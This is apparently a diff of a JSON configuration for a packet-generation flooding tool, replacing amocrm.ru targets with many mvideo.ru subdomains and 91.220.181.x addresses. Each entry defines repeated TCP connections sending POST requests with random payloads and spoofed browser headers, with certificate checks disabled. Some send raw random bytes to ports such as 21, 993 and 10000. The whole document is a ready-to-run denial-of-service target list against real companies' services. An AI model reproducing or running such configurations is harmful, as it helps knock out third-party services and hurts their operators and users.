@@ -8,14 +8,14 @@
         },
         {
             "type": "packetgen",
-            "count": 40,
-            "name": "http://forms.amocrm.ru",
+            "count": 10,
+            "name": "http://sp.mvideo.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "forms.amocrm.ru:80"
+                        "address": "sp.mvideo.ru:80"
                     }
                 },
                 "packet": {
@@ -23,7 +23,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://forms.amocrm.ru",
+                            "path": "http://sp.mvideo.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -36,9 +36,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://forms.amocrm.ru",
-                                "Referer": "http://forms.amocrm.ru",
-                                "X-Forwarded-Host": "forms.amocrm.ru",
+                                "Origin": "http://sp.mvideo.ru",
+                                "Referer": "http://sp.mvideo.ru",
+                                "X-Forwarded-Host": "sp.mvideo.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -49,14 +49,14 @@
         },
         {
             "type": "packetgen",
-            "count": 40,
-            "name": "https://forms.amocrm.ru",
+            "count": 10,
+            "name": "https://webapi.mvideo.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "forms.amocrm.ru:443",
+                        "address": "webapi.mvideo.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -67,7 +67,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://forms.amocrm.ru",
+                            "path": "https://webapi.mvideo.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -80,9 +80,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://forms.amocrm.ru",
-                                "Referer": "https://forms.amocrm.ru",
-                                "X-Forwarded-Host": "forms.amocrm.ru",
+                                "Origin": "https://webapi.mvideo.ru",
+                                "Referer": "https://webapi.mvideo.ru",
+                                "X-Forwarded-Host": "webapi.mvideo.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -93,14 +93,36 @@
         },
         {
             "type": "packetgen",
-            "count": 40,
-            "name": "https://billing.amocrm.ru",
+            "count": 10,
+            "name": "tcp://91.220.181.193:8443",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "billing.amocrm.ru:443",
+                        "address": "91.220.181.193:8443"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.231",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.231:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -111,7 +133,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://billing.amocrm.ru",
+                            "path": "https://91.220.181.231",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -124,9 +146,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://billing.amocrm.ru",
-                                "Referer": "https://billing.amocrm.ru",
-                                "X-Forwarded-Host": "billing.amocrm.ru",
+                                "Origin": "https://91.220.181.231",
+                                "Referer": "https://91.220.181.231",
+                                "X-Forwarded-Host": "91.220.181.231",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -137,40 +159,21 @@
         },
         {
             "type": "packetgen",
-            "count": 40,
-            "name": "http://gso.amocrm.ru",
+            "count": 10,
+            "name": "tcp://91.220.181.85:995",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "gso.amocrm.ru:80"
+                        "address": "91.220.181.85:995"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "POST",
-                            "path": "http://gso.amocrm.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://gso.amocrm.ru",
-                                "Referer": "http://gso.amocrm.ru",
-                                "X-Forwarded-Host": "gso.amocrm.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -178,14 +181,14 @@
         },
         {
             "type": "packetgen",
-            "count": 40,
-            "name": "https://developers.amocrm.ru",
+            "count": 10,
+            "name": "https://pm-sb-port.mvideo.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "developers.amocrm.ru:443",
+                        "address": "pm-sb-port.mvideo.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -196,7 +199,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://developers.amocrm.ru",
+                            "path": "https://pm-sb-port.mvideo.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -209,9 +212,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://developers.amocrm.ru",
-                                "Referer": "https://developers.amocrm.ru",
-                                "X-Forwarded-Host": "developers.amocrm.ru",
+                                "Origin": "https://pm-sb-port.mvideo.ru",
+                                "Referer": "https://pm-sb-port.mvideo.ru",
+                                "X-Forwarded-Host": "pm-sb-port.mvideo.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -222,55 +225,14 @@
         },
         {
             "type": "packetgen",
-            "count": 40,
-            "name": "http://welcome.amocrm.ru",
+            "count": 10,
+            "name": "https://vdi.mvideo.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "welcome.amocrm.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://welcome.amocrm.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://welcome.amocrm.ru",
-                                "Referer": "http://welcome.amocrm.ru",
-                                "X-Forwarded-Host": "welcome.amocrm.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 40,
-            "name": "https://button.amocrm.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "button.amocrm.ru:443",
+                        "address": "vdi.mvideo.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -281,7 +243,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://button.amocrm.ru",
+                            "path": "https://vdi.mvideo.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -294,9 +256,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://button.amocrm.ru",
-                                "Referer": "https://button.amocrm.ru",
-                                "X-Forwarded-Host": "button.amocrm.ru",
+                                "Origin": "https://vdi.mvideo.ru",
+                                "Referer": "https://vdi.mvideo.ru",
+                                "X-Forwarded-Host": "vdi.mvideo.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -307,14 +269,17 @@
         },
         {
             "type": "packetgen",
-            "count": 40,
-            "name": "http://promowp.amocrm.ru",
+            "count": 10,
+            "name": "https://91.220.181.247",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "promowp.amocrm.ru:80"
+                        "address": "91.220.181.247:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
                     }
                 },
                 "packet": {
@@ -322,7 +287,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://promowp.amocrm.ru",
+                            "path": "https://91.220.181.247",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -335,9 +300,2372 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://promowp.amocrm.ru",
-                                "Referer": "http://promowp.amocrm.ru",
-                                "X-Forwarded-Host": "promowp.amocrm.ru",
+                                "Origin": "https://91.220.181.247",
+                                "Referer": "https://91.220.181.247",
+                                "X-Forwarded-Host": "91.220.181.247",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://delivery-qas.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "delivery-qas.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://delivery-qas.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://delivery-qas.mvideo.ru",
+                                "Referer": "https://delivery-qas.mvideo.ru",
+                                "X-Forwarded-Host": "delivery-qas.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.237",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.237:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://91.220.181.237",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://91.220.181.237",
+                                "Referer": "https://91.220.181.237",
+                                "X-Forwarded-Host": "91.220.181.237",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.96:21",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.96:21"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://91.220.181.11",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.11:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://91.220.181.11",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://91.220.181.11",
+                                "Referer": "http://91.220.181.11",
+                                "X-Forwarded-Host": "91.220.181.11",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.248",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.248:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://91.220.181.248",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://91.220.181.248",
+                                "Referer": "https://91.220.181.248",
+                                "X-Forwarded-Host": "91.220.181.248",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://tm.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "tm.mvideo.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://tm.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://tm.mvideo.ru",
+                                "Referer": "http://tm.mvideo.ru",
+                                "X-Forwarded-Host": "tm.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://91.220.181.12",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.12:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://91.220.181.12",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://91.220.181.12",
+                                "Referer": "http://91.220.181.12",
+                                "X-Forwarded-Host": "91.220.181.12",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.5",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.5:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://91.220.181.5",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://91.220.181.5",
+                                "Referer": "https://91.220.181.5",
+                                "X-Forwarded-Host": "91.220.181.5",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://amp.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "amp.mvideo.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://amp.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://amp.mvideo.ru",
+                                "Referer": "http://amp.mvideo.ru",
+                                "X-Forwarded-Host": "amp.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://mvpnr.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "mvpnr.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://mvpnr.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://mvpnr.mvideo.ru",
+                                "Referer": "https://mvpnr.mvideo.ru",
+                                "X-Forwarded-Host": "mvpnr.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.3",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.3:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://91.220.181.3",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://91.220.181.3",
+                                "Referer": "https://91.220.181.3",
+                                "X-Forwarded-Host": "91.220.181.3",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://91.220.181.5",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.5:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://91.220.181.5",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://91.220.181.5",
+                                "Referer": "http://91.220.181.5",
+                                "X-Forwarded-Host": "91.220.181.5",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://sp.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "sp.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://sp.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://sp.mvideo.ru",
+                                "Referer": "https://sp.mvideo.ru",
+                                "X-Forwarded-Host": "sp.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.187:10000",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.187:10000"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.82:993",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.82:993"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://sip.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "sip.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://sip.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://sip.mvideo.ru",
+                                "Referer": "https://sip.mvideo.ru",
+                                "X-Forwarded-Host": "sip.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.15:10000",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.15:10000"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.232",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.232:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://91.220.181.232",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://91.220.181.232",
+                                "Referer": "https://91.220.181.232",
+                                "X-Forwarded-Host": "91.220.181.232",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.190:8080",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.190:8080"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.243",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.243:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://91.220.181.243",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
